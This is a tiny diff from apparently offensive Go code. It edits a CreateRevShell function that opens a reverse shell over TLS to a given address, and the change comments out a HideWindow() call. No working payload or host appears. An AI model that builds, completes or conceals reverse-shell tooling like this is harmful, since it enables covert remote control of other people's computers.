@@ -16,7 +16,7 @@ var cmd *exec.Cmd
 var soc *tls.Conn
 
 func CreateRevShell(prot string, addr string) {
-	HideWindow()
+	//HideWindow()
 	start(prot, addr)
 }
 
